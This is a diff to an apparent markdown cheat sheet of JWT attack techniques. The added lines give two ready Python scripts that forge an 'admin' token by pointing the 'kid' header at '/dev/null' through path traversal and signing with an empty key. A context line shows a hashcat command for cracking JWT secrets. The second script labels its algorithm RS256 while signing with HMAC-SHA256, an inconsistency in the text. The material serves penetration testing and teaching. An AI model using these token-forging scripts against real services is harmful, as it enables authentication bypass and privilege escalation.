@@ -28,6 +28,7 @@ hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
 ## Specific Techniques
 
 The following code exploits the ability to set the KID to a predictable value on a Linux machine
+With `pyjwt` library  
 
 ```python3
 """
@@ -46,11 +47,37 @@ payload = {
 }
 alg = "HS256"
 header = {
-    "kid":"/dev/null"
+    "kid":"../../../../../../dev/null"
 }
 
 token = jwt.encode(payload, secret, algorithm= alg, headers=header)
 print(token)
+```
+
+With built-in libraries:  
+
+```python3
+import hmac
+import base64
+import hashlib
+import json
+
+header = {
+        "alg":"RS256",
+        "kid":"../../../../../../../../dev/null"
+}
+
+key = ""
+
+payload = {
+        "user": "admin"
+}
+
+str = base64.urlsafe_b64encode(bytes(json.dumps(header), encoding='utf8')).decode('utf8').rstrip("=") + "." + base64.urlsafe_b64encode(bytes(json.dumps(payload), encoding='utf8')).decode('utf8').rstrip("=")
+
+sig = base64.urlsafe_b64encode(hmac.new(bytes(key, encoding='utf8'), str.encode('utf8'),hashlib.sha256).digest()).decode('utf8').rstrip("=")
+
+print(str + "." + sig)
 ```
 
 Create keys with OpenSSL and setting 'e' and 'n'
